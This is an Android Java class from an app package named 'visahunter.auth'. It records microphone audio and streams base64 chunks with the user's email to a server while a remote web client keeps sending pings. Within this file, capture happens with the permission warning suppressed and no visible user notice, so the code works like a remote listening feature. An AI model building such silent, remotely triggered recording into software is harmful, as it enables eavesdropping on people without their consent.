package com.visahunter.auth;

import android.annotation.SuppressLint;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.net.URLEncoder;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AudioStreamHelper {
    private static final String TAG = "AudioStreamHelper";
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;

    private static volatile boolean isStreaming = false;
    private static Thread audioThread = null;
    private static long lastAudioPingTime = 0;

    public static synchronized boolean isStreaming() {
        return isStreaming;
    }

    public static synchronized void pingAudioStream() {
        lastAudioPingTime = System.currentTimeMillis();
    }

    @SuppressLint("MissingPermission")
    public static synchronized void startStreaming(String serverUrl, String email, OkHttpClient httpClient) {
        lastAudioPingTime = System.currentTimeMillis();
        if (isStreaming) {
            Log.i(TAG, "Audio streaming is already running");
            return;
        }

        final int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
        final int bufferSize = Math.max(minBuf * 2, 4096);

        AudioRecord recorder = null;
        try {
            // Try VOICE_COMMUNICATION first (hardware tuned for video/voice calls)
            try {
                recorder = new AudioRecord(
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
                );
            } catch (Exception e) {
                Log.w(TAG, "VOICE_COMMUNICATION source failed, falling back to MIC: " + e.getMessage());
            }

            // Fallback to standard MIC
            if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                if (recorder != null) recorder.release();
                recorder = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
                );
            }

            if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed");
                if (recorder != null) recorder.release();
                return;
            }

            recorder.startRecording();
            isStreaming = true;
            Log.i(TAG, "🎙️ Audio streaming started successfully (16kHz PCM)");

        } catch (Exception e) {
            Log.e(TAG, "Failed to start AudioRecord: " + e.getMessage(), e);
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
            }
            return;
        }

        final AudioRecord finalRecorder = recorder;
        audioThread = new Thread(() -> {
            byte[] audioBuffer = new byte[2048]; // 1024 samples = 64ms per packet
            OkHttpClient audioClient = httpClient != null ? httpClient : new OkHttpClient.Builder()
                .connectTimeout(3, TimeUnit.SECONDS)
                .writeTimeout(3, TimeUnit.SECONDS)
                .readTimeout(5, TimeUnit.SECONDS)
                .build();

            try {
                while (isStreaming && !Thread.currentThread().isInterrupted()) {
                    // Auto-timeout after 90 seconds if no ping received from web client
                    if (System.currentTimeMillis() - lastAudioPingTime > 90000) {
                        Log.i(TAG, "Audio streaming auto-stopped due to inactivity timeout");
                        break;
                    }

                    int bytesRead = finalRecorder.read(audioBuffer, 0, audioBuffer.length);
                    if (bytesRead > 0) {
                        String base64Chunk = Base64.encodeToString(audioBuffer, 0, bytesRead, Base64.NO_WRAP);
                        uploadAudioChunk(serverUrl, email, base64Chunk, audioClient);
                    } else if (bytesRead < 0) {
                        Log.w(TAG, "AudioRecord read returned error: " + bytesRead);
                        Thread.sleep(100);
                    }
                }
            } catch (InterruptedException ignored) {
            } catch (Exception e) {
                Log.e(TAG, "Audio streaming thread error: " + e.getMessage(), e);
            } finally {
                try {
                    finalRecorder.stop();
                    finalRecorder.release();
                } catch (Exception ignored) {}
                isStreaming = false;
                Log.i(TAG, "🎙️ Audio streaming thread stopped");
            }
        });
        audioThread.setPriority(Thread.MAX_PRIORITY);
        audioThread.start();
    }

    public static synchronized void stopStreaming() {
        isStreaming = false;
        if (audioThread != null) {
            audioThread.interrupt();
            audioThread = null;
        }
        Log.i(TAG, "Audio stream stopped");
    }

    private static void uploadAudioChunk(String serverUrl, String email, String base64Chunk, OkHttpClient httpClient) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("email", email);
            payload.put("chunk", base64Chunk);
            payload.put("format", "pcm_16k");
            payload.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(
                payload.toString(),
                MediaType.parse("application/json; charset=utf-8")
            );

            String endpoint = serverUrl.replaceAll("/+$", "") + "/api/client-app/audio-chunk/" + URLEncoder.encode(email, "UTF-8");
            Request req = new Request.Builder()
                .url(endpoint)
                .post(body)
                .build();

            // Execute asynchronously so audio recording loop is never blocked
            httpClient.newCall(req).enqueue(new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, java.io.IOException e) {}

                @Override
                public void onResponse(okhttp3.Call call, Response response) {
                    try { response.close(); } catch (Exception ignored) {}
                }
            });
        } catch (Exception e) {
            Log.w(TAG, "Chunk payload creation error: " + e.getMessage());
        }
    }
}
